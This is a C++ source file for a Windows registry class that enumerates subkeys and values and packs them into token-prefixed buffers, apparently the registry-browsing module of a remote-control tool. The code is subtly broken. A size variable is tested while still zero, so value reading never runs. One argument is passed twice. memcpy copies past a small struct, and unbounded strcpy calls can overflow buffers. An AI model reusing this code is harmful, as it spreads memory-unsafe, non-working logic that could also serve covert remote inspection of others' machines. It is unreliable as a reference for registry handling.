#include "stdafx.h"
#include "RegisterOperation.h"
#include "Common.h"
enum MYKEY {
	MHKEY_CLASSES_ROOT,
	MHKEY_CURRENT_USER,
	MHKEY_LOCAL_MACHINE,
	MHKEY_USERS,
	MHKEY_CURRENT_CONFIG
};
struct REGMSG {
	int count;         //名字个数
	DWORD size;             //名字大小
	DWORD valsize;     //值大小

};

enum KEYVALUE {
	MREG_SZ,
	MREG_DWORD,
	MREG_BINARY,
	MREG_EXPAND_SZ
};
RegisterOperation::RegisterOperation(char bToken)
{
	switch (bToken)
	{
	case MHKEY_CLASSES_ROOT:
	{
		m_Key = HKEY_CLASSES_ROOT;
		break;
	}
	
	case MHKEY_CURRENT_USER:
	{
		m_Key = HKEY_CURRENT_USER;
		break;
	}
		
	case MHKEY_LOCAL_MACHINE:
	{
		m_Key = HKEY_LOCAL_MACHINE;
		break;
	}
		
	case MHKEY_USERS:
	{
		m_Key = HKEY_USERS;
		break;
	}
		
	case MHKEY_CURRENT_CONFIG:
	{
		m_Key = HKEY_CURRENT_CONFIG;
		break;
	}
		
	default:
	{
		m_Key = HKEY_LOCAL_MACHINE;
		break;
	}
		
	}
	ZeroMemory(m_KeyPath, MAX_PATH);
}


RegisterOperation::~RegisterOperation()
{
}

VOID RegisterOperation::SetPath(char * szPath)
{
	ZeroMemory(m_KeyPath, MAX_PATH);
	strcpy(m_KeyPath, szPath);
}

char * RegisterOperation::FindPath()
{
	char* szBuffer = NULL;
	HKEY hKey;
	//代开注册表
	if (RegOpenKeyEx(m_Key,m_KeyPath,0,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
	{
		DWORD dwIndex = 0;
		DWORD NameSize = 0;
		DWORD NameMaxLength = 0;
		DWORD NameCount = 0;
		DWORD Type = 0;


		DWORD KeySize = 0;
		DWORD KeyCount = 0;
		DWORD KeyMaxLength = 0;
		DWORD DateSize = 0;
		DWORD MaxDateLength = 0;
		//获得注册表中指定键的信息
		if (RegQueryInfoKey(hKey,NULL,NULL,NULL,
			&KeyCount,&KeyMaxLength,NULL,&NameCount,&NameMaxLength,
			&MaxDateLength,NULL,NULL) != ERROR_SUCCESS)
		{
			return NULL;
		}
		KeySize = KeyMaxLength + 1;
		if (KeyCount > 0 && KeySize > 1)
		{
			int Size = sizeof(REGMSG) + 1;
			DWORD DataSize = KeyCount*KeySize + 1;
			szBuffer = (char*)LocalAlloc(LPTR, DataSize);
			ZeroMemory(szBuffer, DataSize);

			szBuffer[0] = TOKEN_REG_PATH;
			REGMSG msg;
			msg.size = KeySize;
			msg.count = KeyCount;
			memcpy(szBuffer + 1, (void*)&msg, Size);


			char* szTemp = new char[KeySize];

			for (dwIndex = 0; dwIndex < KeyCount ; dwIndex++)
			{
				ZeroMemory(szTemp, KeySize);
				DWORD i = KeySize;
				//的注册表子健
				RegEnumKeyEx(hKey, dwIndex, szTemp, &i, NULL, NULL, NULL, NULL);
				strcpy(szBuffer + dwIndex*KeySize + Size, szTemp);

			}
			delete[] szTemp;
			RegCloseKey(hKey);
		}
	}
	return szBuffer;
}

char * RegisterOperation::FindKey()
{
	char* szValueName = NULL;  //键值名称
	char* szKetName = NULL;    //子健名称
	LPBYTE szValueDate;

	char* szBuffer = NULL;
	HKEY hKey;
	if (RegOpenKeyEx(m_Key, m_KeyPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{

		DWORD dwIndex = 0;
		DWORD NameSize = 0;
		DWORD NameMaxLength = 0;
		DWORD NameCount = 0;
		DWORD Type = 0;


		DWORD KeySize = 0;
		DWORD KeyCount = 0;
		DWORD KeyMaxLength = 0;
		DWORD DateSize = 0;
		DWORD MaxDateLength = 0;
		if (RegQueryInfoKey(hKey, NULL, NULL, NULL,
			&KeyCount, &KeyMaxLength, NULL, &NameCount, &NameMaxLength, &KeyMaxLength, NULL, NULL) != ERROR_SUCCESS)
		{

			return NULL;
		}
		int a = GetLastError();
		if (NameCount > 0 && MaxDateLength > 0 && NameSize > 0)
		{
			DateSize = MaxDateLength + 1;
			NameSize = NameMaxLength + 100;
			REGMSG Msg;
			Msg.count = NameCount;
			Msg.size = NameSize;
			Msg.valsize = DateSize;

			DWORD size = sizeof(REGMSG) +
				sizeof(BYTE)*NameCount + NameSize*NameCount + 
				DateSize * NameCount + 10;

			szBuffer = (char*)LocalAlloc(LPTR, size);
			szBuffer[0] = TOKEN_REG_KEY;
			memcpy(szBuffer + 1, (void*)&Msg, Msg.size);

			szValueName = (char*)malloc(NameSize);
			szValueDate = (LPBYTE)malloc(DateSize);

			char* szTemp = szBuffer + Msg.size + 1;
			for (dwIndex = 0;dwIndex < NameCount;dwIndex++)
			{
				ZeroMemory(szValueName, NameSize);
				ZeroMemory(szValueDate, DateSize);
				DateSize = MaxDateLength + 1;
				NameSize = NameMaxLength + 100;

				RegEnumValue(hKey, dwIndex, szValueName, &NameSize,
					NULL, &Type, szValueDate, &DateSize);//读取键值

				if (Type == REG_SZ)
				{
					szTemp[0] = MREG_SZ;
				}
				if (Type == REG_DWORD)
				{

					szTemp[0] = MREG_DWORD;
				}
				if (Type == REG_BINARY)
				{
					szTemp[0] = MREG_BINARY;
				}
				if (Type == REG_EXPAND_SZ)
				{
					szTemp[0] = MREG_EXPAND_SZ;
				}
				szTemp += sizeof(BYTE);
				strcpy(szTemp, szValueName);
				szTemp += Msg.size;
				memcpy(szTemp, szValueDate, Msg.valsize);
				szTemp += Msg.valsize;
			}
			free(szValueName);
			free(szValueDate);
		}
	}
	return szBuffer;
}
